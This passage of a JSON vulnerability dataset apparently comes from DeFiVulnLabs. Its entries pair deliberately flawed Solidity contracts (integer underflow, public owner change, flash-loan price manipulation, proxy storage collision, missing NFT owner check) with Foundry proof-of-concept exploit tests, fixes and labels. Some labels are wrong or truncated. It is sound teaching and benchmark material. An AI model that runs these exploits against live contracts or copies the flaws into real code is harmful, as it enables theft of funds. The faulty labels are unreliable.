    "vulnerable_contract_only": "contract SimpleBank {\n    mapping(address => uint) private balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function getBalance() public view returns (uint) {\n        return balances[msg.sender];\n    }\n\n    function withdraw(uint amount) public {\n        require(balances[msg.sender] >= amount);\n        balances[msg.sender] -= amount;\n        // the issue is here\n        payable(msg.sender).transfer(amount);\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 3,
    "vulnerability_name": "Incorrect use of payable.transfer()",
    "description": "After the implementation of EIP 1884 in the Istanbul hard fork, \nthe gas cost of the SLOAD operation was increased, \nresulting in the breaking of some existing smart contracts.\n\nWhen transferring ETH to recipients, if Solidity's transfer() or send() method \nis used, certain shortcomings arise, particularly when the recipient \nis a smart contract. These shortcomings can make it impossible to \nsuccessfully transfer ETH to the smart contract recipient.\n\nSpecifically, the transfer will inevitably fail when the smart contract:\n    1.does not implement a payable fallback function, or\n    2.implements a payable fallback function which would incur more than 2300 gas units, or\n    3.implements a payable fallback function incurring less than 2300 gas units but is called through a proxy that raises the call\u2019s gas usage above 2300.",
    "scenario": "",
    "fix_description": "Using call with its returned boolean checked in combination with re-entrancy guard is highly recommended.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": true,
    "context_level": "intra_contract",
    "original_source_path": "src/test/payable-transfer.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_overflow2",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Overflow2.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.7.6;\n// this need to be older version of solidity from 0.8.0 solidty compiler checks for overflow and underflow\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Token Whale Overflow Vulnerability\n\nDescription:\nThis contract demonstrates an integer underflow vulnerability in an ERC20 token contract. \nThe vulnerability exists in the implementation of the transferFrom function. Due to the lack \nof automatic overflow checking in Solidity versions before 0.8.0, attackers can exploit \nthis vulnerability to generate a large amount of tokens.\n\nHow it works:\n1. Contract initializes with deployer receiving 1000 tokens\n2. Deployer transfers 800 tokens to Alice\n3. Alice approves the attacker to spend 1000 tokens\n4. Attacker uses transferFrom to transfer 500 tokens from Alice to Bob\n5. Due to the lack of overflow checking in the _transfer function's subtraction operation, \n   an underflow occurs when Alice's balance is insufficient\n6. The underflow causes Alice's balance to become an extremely large number, \n   effectively creating tokens out of thin air\n\nImpact: \n- Affects contracts using Solidity < 0.8.0\n- Contracts not using SafeMath library\n\nMitigation:\n1. Use Solidity 0.8.0 or later which has built-in overflow checking\n2. Use SafeMath library for older versions\n3. Properly validate balances before transfers\n\nThis vulnerability demonstrates why proper integer overflow/underflow protection is crucial \nin smart contract development, particularly in token contracts where numerical operations \nare frequent and critical to the contract's security.\n*/\n\ncontract ContractTest is Test {\n    TokenWhaleChallenge TokenWhaleChallengeContract;\n\n    function testOverflow2() public {\n        address alice = vm.addr(1);\n        address bob = vm.addr(2);\n\n        TokenWhaleChallengeContract = new TokenWhaleChallenge();\n        TokenWhaleChallengeContract.TokenWhaleDeploy(address(this));\n        console.log(\n            \"Player balance:\",\n            TokenWhaleChallengeContract.balanceOf(address(this))\n        );\n        TokenWhaleChallengeContract.transfer(address(alice), 800);\n\n        vm.prank(alice);\n        TokenWhaleChallengeContract.approve(address(this), 1000);\n        TokenWhaleChallengeContract.transferFrom(\n            address(alice),\n            address(bob),\n            500\n        ); //exploit here\n\n        console.log(\"Exploit completed, balance overflowed\");\n        console.log(\n            \"Player balance:\",\n            TokenWhaleChallengeContract.balanceOf(address(this))\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract TokenWhaleChallenge {\n    address player;\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    string public name = \"Simple ERC20 Token\";\n    string public symbol = \"SET\";\n    uint8 public decimals = 18;\n\n    function TokenWhaleDeploy(address _player) public {\n        player = _player;\n        totalSupply = 1000;\n        balanceOf[player] = 1000;\n    }\n\n    function isComplete() public view returns (bool) {\n        return balanceOf[player] >= 1000000;\n    }\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function _transfer(address to, uint256 value) internal {\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n\n        emit Transfer(msg.sender, to, value);\n    }\n\n    function transfer(address to, uint256 value) public {\n        require(balanceOf[msg.sender] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n\n        _transfer(to, value);\n    }\n\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n\n    function approve(address spender, uint256 value) public {\n        allowance[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n    }\n\n    function transferFrom(address from, address to, uint256 value) public {\n        require(balanceOf[from] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n        require(allowance[from][msg.sender] >= value);\n\n        allowance[from][msg.sender] -= value;\n        _transfer(to, value);\n    }\n}\n",
    "vulnerable_contract_only": "contract TokenWhaleChallenge {\n    address player;\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    string public name = \"Simple ERC20 Token\";\n    string public symbol = \"SET\";\n    uint8 public decimals = 18;\n\n    function TokenWhaleDeploy(address _player) public {\n        player = _player;\n        totalSupply = 1000;\n        balanceOf[player] = 1000;\n    }\n\n    function isComplete() public view returns (bool) {\n        return balanceOf[player] >= 1000000;\n    }\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function _transfer(address to, uint256 value) internal {\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n\n        emit Transfer(msg.sender, to, value);\n    }\n\n    function transfer(address to, uint256 value) public {\n        require(balanceOf[msg.sender] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n\n        _transfer(to, value);\n    }\n\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n\n    function approve(address spender, uint256 value) public {\n        allowance[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n    }\n\n    function transferFrom(address from, address to, uint256 value) public {\n        require(balanceOf[from] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n        require(allowance[from][msg.sender] >= value);\n\n        allowance[from][msg.sender] -= value;\n        _transfer(to, value);\n    }\n}\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "integer_issues",
    "severity": "high",
    "difficulty_tier": 2,
    "vulnerability_name": "Token Whale Overflow Vulnerability",
    "description": "This contract demonstrates an integer underflow vulnerability in an ERC20 token contract. \nThe vulnerability exists in the implementation of the transferFrom function. Due to the lack \nof automatic overflow checking in Solidity versions before 0.8.0, attackers can exploit \nthis vulnerability to generate a large amount of tokens.\n\nHow it works:\n1. Contract initializes with deployer receiving 1000 tokens\n2. Deployer transfers 800 tokens to Alice\n3. Alice approves the attacker to spend 1000 tokens\n4. Attacker uses transferFrom to transfer 500 tokens from Alice to Bob\n5. Due to the lack of overflow checking in the _transfer function's subtraction operation, \n   an underflow occurs when Alice's balance is insufficient\n6. The underflow causes Alice's balance to become an extremely large number, \n   effectively creating tokens out of thin air",
    "scenario": "",
    "fix_description": "1. Use Solidity 0.8.0 or later which has built-in overflow checking\n2. Use SafeMath library for older versions\n3. Properly validate balances before transfers\n\nThis vulnerability demonstrates why proper integer overflow/underflow protection is crucial \nin smart contract development, particularly in token contracts where numerical operations \nare frequent and critical to the contract's security.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/Overflow2.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_visibility",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Visibility.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\nimport \"forge-std/Test.sol\";\n\n/*\nName: Improper Access Control Vulnerability\n\nDescription:\nThe default visibility of the function is Public. \nIf there is an unsafe visibility setting, the attacker can directly call the sensitive function in the smart contract.\n\nThe ownerGame contract has a changeOwner function that is intended to change the owner of the contract.\nHowever, due to improper access control, this function is publicly accessible and \ncan be called by any external account or contract. As a result, an attacker can call this function\nto change the ownership of the contract and take control.\n\nImpact: the owner of the contract can be changed by anyone.\n\nMitigation:\nUse access control modifiers: Solidity provides modifiers, such as onlyOwner, \nwhich can be used to restrict the access of functions\n \n*/\n\ncontract ContractTest is Test {\n    ownerGame ownerGameContract;\n\n    function testVisibility() public {\n        ownerGameContract = new ownerGame();\n        console.log(\n            \"Before exploiting, owner of ownerGame:\",\n            ownerGameContract.owner()\n        );\n        ownerGameContract.changeOwner(msg.sender);\n        console.log(\n            \"After exploiting, owner of ownerGame:\",\n            ownerGameContract.owner()\n        );\n        console.log(\"Exploit completed\");\n    }\n\n    receive() external payable {}\n}\n\ncontract ownerGame {\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    // wrong visibility of changeOwner function should be onlyOwner\n    function changeOwner(address _new) public {\n        owner = _new;\n    }\n}\n",
    "vulnerable_contract_only": "contract ownerGame {\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    // wrong visibility of changeOwner function should be onlyOwner\n    function changeOwner(address _new) public {\n        owner = _new;\n    }\n}\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "access_control",
    "severity": "high",
    "difficulty_tier": 2,
    "vulnerability_name": "Improper Access Control Vulnerability",
    "description": "The default visibility of the function is Public. \nIf there is an unsafe visibility setting, the attacker can directly call the sensitive function in the smart contract.\n\nThe ownerGame contract has a changeOwner function that is intended to change the owner of the contract.\nHowever, due to improper access control, this function is publicly accessible and \ncan be called by any external account or contract. As a result, an attacker can call this function\nto change the ownership of the contract and take control.",
    "scenario": "",
    "fix_description": "Use access control modifiers: Solidity provides modifiers, such as onlyOwner, \nwhich can be used to restrict the access of functions",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/Visibility.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_price_manipulation",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Price_manipulation.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\n/*\nName: Price manipulation\n\nDescription:\nIncorrect price calculation over balanceOf, getReverse may refer to a situation \nwhere the price of a token or asset is not accurately calculated based on the balanceOf function.\n\nMitigation:  \nUse a manipulation resistant oracle, chainlink, TWAP, etc.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1673948842738487296\nhttps://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/past/2022#20221012-atk---flashloan-manipulate-price\nhttps://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/past/2022#20220807-egd-finance---flashloans--price-manipulation\nhttps://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/past/2022#20220428-deus-dao---flashloan--price-oracle-manipulation\n*/\n\ncontract ContractTest is Test {\n    USDa USDaContract;\n    USDb USDbContract;\n    SimplePool SimplePoolContract;\n    SimpleBank SimpleBankContract;\n\n    function setUp() public {\n        USDaContract = new USDa();\n        USDbContract = new USDb();\n        SimplePoolContract = new SimplePool(\n            address(USDaContract),\n            address(USDbContract)\n        );\n        SimpleBankContract = new SimpleBank(\n            address(USDaContract),\n            address(SimplePoolContract),\n            address(USDbContract)\n        );\n    }\n\n    function testPrice_Manipulation() public {\n        USDbContract.transfer(address(SimpleBankContract), 9000 ether);\n        USDaContract.transfer(address(SimplePoolContract), 1000 ether);\n        USDbContract.transfer(address(SimplePoolContract), 1000 ether);\n        // Get the current price of USDa in terms of USDb (initially 1 USDa : 1 USDb)\n        SimplePoolContract.getPrice(); // 1 USDa : 1 USDb\n\n        console.log(\n            \"There are 1000 USDa and USDb in the pool, so the price of USDa is 1 to 1 USDb.\"\n        );\n        emit log_named_decimal_uint(\n            \"Current USDa convert rate\",\n            SimplePoolContract.getPrice(),\n            18\n        );\n        console.log(\"Start price manipulation\");\n        console.log(\"Borrow 500 USBa over floashloan\");\n        // Let's manipulate the price since the getPrice is over the balanceOf.\n        // Use flashloan to borrow 500 USDa\n        SimplePoolContract.flashLoan(500 ether, address(this), \"0x0\");\n    }\n\n    fallback() external {\n        //flashlon callback\n\n        emit log_named_decimal_uint(\n            \"Price manupulated, USDa convert rate\",\n            SimplePoolContract.getPrice(),\n            18\n        ); // 1 USDa : 2 USDb\n\n        USDaContract.approve(address(SimpleBankContract), 100 ether);\n        SimpleBankContract.exchange(100 ether);\n\n        // Repay the flashloan by transferring 500 USDb to SimplePoolContract\n        USDaContract.transfer(address(SimplePoolContract), 500 ether);\n\n        // Get the balance of USDb owned by us.\n        emit log_named_decimal_uint(\n            \"Use 100 USDa to convert, My USDb balance\",\n            USDbContract.balanceOf(address(this)),\n            18\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract USDa is ERC20, Ownable {\n    constructor() ERC20(\"USDA\", \"USDA\") {\n        _mint(msg.sender, 10000 * 10 ** decimals());\n    }\n\n    function mint(address to, uint256 amount) public onlyOwner {\n        _mint(to, amount);\n    }\n}\n\ncontract USDb is ERC20, Ownable {\n    constructor() ERC20(\"USDB\", \"USDB\") {\n        _mint(msg.sender, 10000 * 10 ** decimals());\n    }\n\n    function mint(address to, uint256 amount) public onlyOwner {\n        _mint(to, amount);\n    }\n}\n\ncontract SimplePool {\n    IERC20 public USDaToken;\n    IERC20 public USDbToken;\n\n    constructor(address _USDa, address _USDb) {\n        USDaToken = IERC20(_USDa);\n        USDbToken = IERC20(_USDb);\n    }\n\n    function getPrice() public view returns (uint256) {\n        //Incorrect price calculation over balanceOf\n        uint256 USDaAmount = USDaToken.balanceOf(address(this));\n        uint256 USDbAmount = USDbToken.balanceOf(address(this));\n\n        // Ensure USDbAmount is not zero to prevent division by zero\n        if (USDaAmount == 0) {\n            return 0;\n        }\n\n        // Calculate the price as the ratio of USDa to USDb\n        uint256 USDaPrice = (USDbAmount * (10 ** 18)) / USDaAmount;\n        return USDaPrice;\n    }\n\n    function flashLoan(\n        uint256 amount,\n        address borrower,\n        bytes calldata data\n    ) public {\n        uint256 balanceBefore = USDaToken.balanceOf(address(this));\n        require(balanceBefore >= amount, \"Not enough liquidity\");\n        require(\n            USDaToken.transfer(borrower, amount),\n            \"Flashloan transfer failed\"\n        );\n        (bool success, ) = borrower.call(data);\n        require(success, \"Flashloan callback failed\");\n        uint256 balanceAfter = USDaToken.balanceOf(address(this));\n        require(balanceAfter >= balanceBefore, \"Flashloan not repaid\");\n    }\n}\n\ncontract SimpleBank {\n    IERC20 public token; //USDA\n    SimplePool public pool;\n    IERC20 public payoutToken; //USDb\n\n    constructor(address _token, address _pool, address _payoutToken) {\n        token = IERC20(_token);\n        pool = SimplePool(_pool);\n        payoutToken = IERC20(_payoutToken);\n    }\n\n    function exchange(uint256 amount) public {\n        require(\n            token.transferFrom(msg.sender, address(this), amount),\n            \"Transfer failed\"\n        );\n        uint256 price = pool.getPrice();\n        require(price > 0, \"Price cannot be zero\");\n        uint256 tokensToReceive = (amount * price) / (10 ** 18);\n        require(\n            payoutToken.transfer(msg.sender, tokensToReceive),\n            \"Payout transfer failed\"\n        );\n    }\n}\n",
    "vulnerable_contract_only": "contract USDa {\n    constructor() ERC20(\"USDA\", \"USDA\") {\n        _mint(msg.sender, 10000 * 10 ** decimals());\n    }\n\n    function mint(address to, uint256 amount) public onlyOwner {\n        _mint(to, amount);\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "oracle_manipulation",
    "severity": "critical",
    "difficulty_tier": 4,
    "vulnerability_name": "Price manipulation",
    "description": "Incorrect price calculation over balanceOf, getReverse may refer to a situation \nwhere the price of a token or asset is not accurately calculated based on the balanceOf function.",
    "scenario": "",
    "fix_description": "Use a manipulation resistant oracle, chainlink, TWAP, etc.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/Price_manipulation.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_storage-collision-audio",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Storage-collision-audio.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol\";\n\n// We take Audius as an example. For more details, you can refer to Audius Governance Takeover Post-Mortem 7/23/22 and Remediation.\n// https://blog.audius.co/article/audius-governance-takeover-post-mortem-7-23-22\n\ninterface ILogic {\n    function getguardianAddress() external returns (address);\n\n    function getproxyAdmin() external returns (address);\n\n    function initialize(address) external;\n\n    function getinitializing() external returns (bool);\n\n    function getinitialized() external returns (bool);\n\n    function isConstructor() external view returns (bool);\n}\n\ncontract ContractTest is Test {\n    Logic LogicContract;\n    TestProxy ProxyContract;\n\n    function testStorageCollision() public {\n        LogicContract = new Logic();\n        ProxyContract = new TestProxy(\n            address(LogicContract),\n            address(msg.sender),\n            address(this)\n        );\n\n        console.log(\n            \"Current guardianAddress:\",\n            ILogic(address(ProxyContract)).getguardianAddress()\n        );\n        console.log(\n            \"Current initializing boolean:\",\n            ILogic(address(ProxyContract)).getinitializing()\n        );\n        console.log(\n            \"Current initialized boolean:\",\n            ILogic(address(ProxyContract)).getinitialized()\n        );\n        console.log(\"Try to call initialize to change guardianAddress\");\n        ILogic(address(ProxyContract)).initialize(address(msg.sender));\n\n        console.log(\n            \"After initializing, changed guardianAddress to attacker:\",\n            ILogic(address(ProxyContract)).getguardianAddress()\n        );\n        console.log(\n            \"After initializing,  initializing boolean is still true:\",\n            ILogic(address(ProxyContract)).getinitializing()\n        );\n        console.log(\n            \"After initializing,  initialized boolean:\",\n            ILogic(address(ProxyContract)).getinitialized()\n        );\n\n        /*\nIn this case because the last byte of the proxyAdmin address is `0x72`, initialized was interpreted as a truthy value. \nSimilarly, because the second byte of the proxyAdmin address is `0xea`, \ninitializing was also interpreted as a truthy value. This caused the initializer() modifier to always succeed:\n*/\n\n        console.log(\"Exploit completed\");\n    }\n\n    receive() external payable {}\n}\n\ncontract TestProxy is TransparentUpgradeableProxy {\n    address private proxyAdmin; // slot 0 - storage collision here\n\n    constructor(\n        address _logic,\n        address _admin,\n        address guardianAddress\n    )\n        TransparentUpgradeableProxy(\n            _logic,\n            _admin,\n            abi.encodeWithSelector(\n                bytes4(0xc4d66de8), // bytes4(keccak256(\"initialize(address)\"))\n                guardianAddress\n            )\n        )\n    {\n        proxyAdmin = _admin;\n    }\n}\n\ncontract Initializable {\n    /**\n     * @dev Indicates that the contract has been initialized.\n     */\n    bool private initialized;\n\n    /**\n     * @dev Indicates that the contract is in the process of being initialized.\n     */\n    bool private initializing;\n\n    /**\n     * @dev Modifier to use in the initializer function of a contract.\n     */\n    modifier initializer() {\n        require(\n            initializing || isConstructor() || !initialized,\n            \"Contract instance has already been initialized\"\n        );\n\n        bool isTopLevelCall = !initializing;\n        if (isTopLevelCall) {\n            initializing = true;\n            initialized = true;\n        }\n\n        _;\n\n        if (isTopLevelCall) {\n            initializing = false;\n        }\n    }\n\n    /// @dev Returns true if and only if the function is running in the constructor\n    function isConstructor() private view returns (bool) {\n        // extcodesize checks the size of the code stored in an address, and\n        // address returns the current address. Since the code is still not\n        // deployed when running a constructor, any checks on its code size will\n        // yield zero, making it an effective way to detect if a contract is\n        // under construction or not.\n        address self = address(this);\n        uint256 cs;\n        assembly {\n            cs := extcodesize(self)\n        }\n        return cs == 0;\n    }\n\n    // Reserved storage space to allow for layout changes in the future.\n    uint256[50] private ______gap;\n\n    function getinitializing() public view returns (bool) {\n        return initializing;\n    }\n\n    function getinitialized() public view returns (bool) {\n        return initialized;\n    }\n}\n\ncontract Logic is Initializable {\n    address private guardianAddress;\n\n    function initialize(address _guardianAddress) public initializer {\n        guardianAddress = _guardianAddress; //Guardian address becomes the only party\n    }\n\n    function getguardianAddress() public view returns (address) {\n        return guardianAddress;\n    }\n}\n",
    "vulnerable_contract_only": "contract Initializable {\n    /**\n     * @dev Indicates that the ",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "storage_collision",
    "severity": "high",
    "difficulty_tier": 4,
    "vulnerability_name": "In this case because the last byte of the proxyAdmin address is `0x72`, initialized was interpreted as a truthy value.",
    "description": "In this case because the last byte of the proxyAdmin address is `0x72`, initialized was interpreted as a truthy value.",
    "scenario": "",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/Storage-collision-audio.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_divmultiply",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Divmultiply.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Precision Issues - Divide before multiply\n\nDescription:\nThe contracts demonstrate a common issue when performing division operations in Solidity, \nas Solidity doesn't support floating-point numbers. The order of operations can affect the result due to integer truncation.\n\nIn the Miscalculation contract, the function price performs the division before the\nmultiplication (price / 100) * discount. Due to the fact that Solidity truncates integers\nwhen dividing, the result of price / 100 will be 0 if the price is less than 100. \nThis causes the result of the multiplication to be 0 as well.\n\nOn the other hand, in the Calculation contract, the function price performs the multiplication\nbefore the division (price * discount) / 100. This way, the result will be correct as the multiplication\ndoesn't get truncated, only the final result does.\n\nMitigation:Always perform multiplication before division to avoid losing precision.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1599774264437395461\nhttps://blog.solidityscan.com/precision-loss-in-arithmetic-operations-8729aea20be9\n\n*/\ncontract ContractTest is Test {\n    Miscalculation MiscalculationContract;\n    Calculation CalculationContract;\n\n    function testMiscalculation() public {\n        MiscalculationContract = new Miscalculation();\n        console.log(\"Perform Miscalculation Contract\");\n        console.log(\n            \"Scenario: DeFi store 10% off now, Then we buy 1 item price: $80.\"\n        );\n        console.log(\n            \"Subtract the discount, get the sale price:\",\n            MiscalculationContract.price(80, 90)\n        );\n        console.log(\n            \"Solidity doesn't do decimals, so dividing before multiplying will round to zero. 0.8*90=0\"\n        );\n        console.log(\n            \"---------------------------------------------------------\"\n        );\n        CalculationContract = new Calculation();\n        console.log(\"Perform Correct calculation Contract\");\n        console.log(\n            \"Scenario: DeFi store 10% off now, Then we buy 1 item price: $80.\"\n        );\n        console.log(\n            \"Subtract  the discount, get the sale price:\",\n            CalculationContract.price(80, 90)\n        );\n        console.log(\"Multiply before dividing is correct. 80*90/100=72\");\n    }\n}\n\ncontract Miscalculation {\n    function price(\n        uint256 price,\n        uint256 discount\n    ) public pure returns (uint256) {\n        return (price / 100) * discount; // wrong calculation\n    }\n}\n\ncontract Calculation {\n    function price(\n        uint256 price,\n        uint256 discount\n    ) public pure returns (uint256) {\n        return (price * discount) / 100; // correct calculation\n    }\n}\n",
    "vulnerable_contract_only": "contract Miscalculation {\n    function price(\n        uint256 price,\n        uint256 discount\n    ) public pure returns (uint256) {\n        return (price / 100) * discount; // wrong calculation\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "oracle_manipulation",
    "severity": "critical",
    "difficulty_tier": 2,
    "vulnerability_name": "Precision Issues - Divide before multiply",
    "description": "The contracts demonstrate a common issue when performing division operations in Solidity, \nas Solidity doesn't support floating-point numbers. The order of operations can affect the result due to integer truncation.\n\nIn the Miscalculation contract, the function price performs the division before the\nmultiplication (price / 100) * discount. Due to the fact that Solidity truncates integers\nwhen dividing, the result of price / 100 will be 0 if the price is less than 100. \nThis causes the result of the multiplication to be 0 as well.\n\nOn the other hand, in the Calculation contract, the function price performs the multiplication\nbefore the division (price * discount) / 100. This way, the result will be correct as the multiplication\ndoesn't get truncated, only the final result does.",
    "scenario": "",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/Divmultiply.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_nft-transfer",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "NFT-transfer.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\n/*\nName: Unauthorized NFT Transfer in custom ERC721 implementation.\n\nDescription:\nCustom transferFrom function in contract VulnerableERC721, \ndoes not properly check if msg.sender is the current owner of the token or an approved address.\nAs a result, any address can call the transferFrom function to transfer any token, \nregardless of who the current owner is. \nThis allows unauthorized users to transfer tokens they do not own, leading to potential theft of assets.\n\n \nMitigation:  \nTo ensure that msg.sender is the current owner of the token or an approved address.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1679120390281412609\nhttps://blog.decurity.io/scanning-for-vulnerable-erc721-implementations-fe19200b91b5\nhttps://ventral.digital/posts/2022/8/18/sznsdaos-bountyboard-unauthorized-transferfrom-vulnerability\nhttps://github.com/pessimistic-io/slitherin/blob/master/docs/nft_approve_warning.md\n*/\n\ncontract ContractTest is Test {\n    VulnerableERC721 VulnerableERC721Contract;\n    FixedERC721 FixedERC721Contract;\n    address alice = vm.addr(1);\n    address bob = vm.addr(2);\n\n    function setUp() public {\n        VulnerableERC721Contract = new VulnerableERC721();\n        VulnerableERC721Contract.safeMint(alice, 1);\n        FixedERC721Contract = new FixedERC721();\n        FixedERC721Contract.safeMint(alice, 1);\n    }\n\n    function testVulnerableERC721() public {\n        VulnerableERC721Contract.ownerOf(1);\n        vm.prank(bob);\n        VulnerableERC721Contract.transferFrom(address(alice), address(bob), 1);\n\n        console.log(VulnerableERC721Contract.ownerOf(1));\n    }\n\n    function testFixedERC721() public {\n        FixedERC721Contract.ownerOf(1);\n        vm.prank(bob);\n        vm.expectRevert();\n        FixedERC721Contract.transferFrom(address(alice), address(bob), 1);\n        console.log(VulnerableERC721Contract.ownerOf(1));\n    }\n\n    receive() external payable {}\n\n    function onERC721Received(\n        address,\n        address,\n        uint256,\n        bytes memory\n    ) external pure returns (bytes4) {\n        return this.onERC721Received.selector;\n    }\n}\n\ncontract VulnerableERC721 is ERC721, Ownable {\n    constructor() ERC721(\"MyNFT\", \"MNFT\") {}\n\n    //custom transferFrom function which missing NFT owner check.\n    function transferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) public override {\n        // direct transfer\n        _transfer(from, to, tokenId);\n    }\n\n    function safeMint(address to, uint256 tokenId) public onlyOwner {\n        _safeMint(to, tokenId);\n    }\n}\n\ncontract FixedERC721 is ERC721, Ownable {\n    constructor() ERC721(\"MyNFT\", \"MNFT\") {}\n\n    //Mitigation: add token owner check\n    function transferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) public override {\n        require(\n            _isApprovedOrOwner(_msgSender(), tokenId),\n            \"ERC721: caller is not token owner or approved\"\n        );\n\n        _transfer(from, to, tokenId);\n    }\n\n    function safeMint(address to, uint256 tokenId) public onlyOwner {\n        _safeMint(to, tokenId);\n    }\n    /*\n    function _isApprovedOrOwner(address spender, uint256 tokenId) internal view virtual returns (bool) {\n        address owner = ERC721.ownerOf(tokenId);\n        return (spender == owner || isApprovedForAll(owner, spender) || getApproved(tokenId) == spender);\n    }\n*/\n}\n",
    "vulnerable_contract_only": "contract VulnerableERC721 {\n    constructor() ERC721(\"MyNFT\", \"MNFT\") {}\n\n    //custom transferFrom function which missing NFT owner check.\n    function transferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) public override {\n        // direct transfer\n        _transfer(from, to, tokenId);\n    }\n\n    function safeMint(address to, uint256 tokenId) public onlyOwner {\n        _safeMint(to, tokenId);\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 3,
    "vulnerability_name": "Unauthorized NFT Transfer in custom ERC721 implementation.",
    "description": "Custom transferFrom function in contract VulnerableERC721, \ndoes not properly check if msg.sender is the current owner of the token or an approved address.\nAs a result, any address can call the transferFrom function to transfer any token, \nregardless of who the current owner is. \nThis allows unauthorized users to transfer tokens they do not own, leading to potential theft of assets.",
    "scenario": "",
    "fix_description": "To ensure that msg.sender is the current owner of the token or an approved address.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": true,
    "context_level": "intra_contract",
    "original_source_path": "src/test/NFT-transfer.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_phantom-permit",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "phantom-permit.sol",
